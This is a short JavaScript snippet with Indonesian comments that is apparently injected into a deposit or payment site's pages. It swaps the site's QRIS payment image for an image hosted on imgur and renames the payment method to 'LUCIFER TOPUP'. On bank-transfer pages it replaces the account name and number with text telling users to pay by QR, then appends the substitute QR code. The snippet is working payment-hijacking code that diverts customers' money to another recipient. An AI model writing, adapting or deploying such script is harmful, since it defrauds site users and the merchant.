(function() {
  const url = window.location.href;

  // Fungsi untuk jalankan hanya di qris.php
  if (url.endsWith('qris.php')) {
    // Ganti URL gambar
    document.querySelectorAll('img').forEach(img => {
      if (img.src === "https://files.catbox.moe/beykv3.jpeg") {
        img.src = "https://i.imgur.com/SF1u29Y";
      }
    });

    // Ganti value di <select>
    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("WARJI CELL")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  // Fungsi untuk jalankan di url /?bank=NDk5 dll
  const bankParams = ['MTUw','MTUx','MTQ4','MTQ5','MTUy','MTU0','MTU2'];
  if (bankParams.some(param => url.endsWith(`/?bank=${param}`))) {
    // Nama Akun Bank
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    // Rekening Bank No
    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    // Tambahkan gambar di bawah Rekening Bank No
    const rekeningContainer = rekeningInput.parentElement;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://i.imgur.com/SF1u29Y";
      img.style.maxWidth = "200px"; // Atur ukuran sesuai kebutuhan
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }
})();
